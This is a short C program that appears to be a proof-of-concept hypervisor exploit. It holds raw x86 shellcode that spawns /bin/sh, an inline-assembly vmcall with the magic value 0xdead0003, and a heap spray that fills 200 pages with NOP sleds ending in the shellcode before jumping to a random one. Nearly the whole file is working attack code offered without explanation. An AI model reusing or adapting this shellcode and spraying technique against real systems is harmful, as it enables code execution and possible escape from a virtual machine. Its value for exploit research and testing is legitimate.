#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define PAGENUM 200

static void hypercall();

















unsigned char sc[] = 
  "\x31\xc0\x50\x68\x2f\x2f\x73"
  "\x68\x68\x2f\x62\x69\x6e\x89"
  "\xe3\x89\xc1\x89\xc2\xb0\x0b"
  "\xcd\x80\x31\xc0\x40\xcd\x80";

static void hypercall()
{
  printf("Sending hypercall...\n");
  
  __asm__ __volatile__ (
			"pushal\n"
			"movl $0xdead0003, %eax\n"
			"vmcall\n"
			"popal\n"
			);
  printf("Done.\n");
}

int main()
{
  char *p[PAGENUM];
  int i, j;

  srand(time(NULL));

  hypercall();

  for(i = 0; i < PAGENUM; i++) {
    p[i] = malloc(0x1000);
    printf("[++] Write from 0x%08x to 0x%08x\n", p[i], p[i]+0x1000-1);
    for(j = 0; j < 0x1000-sizeof(sc); j++)
      p[i][j] = 0x90;
    memcpy(p[i]+0x1000-sizeof(sc), sc, sizeof(sc));
  }

  char *guess = p[rand() % PAGENUM];
  sleep(2);

  printf("[+] Jump @ %p\n", guess); 

  (*(void (*)()) guess)();
}
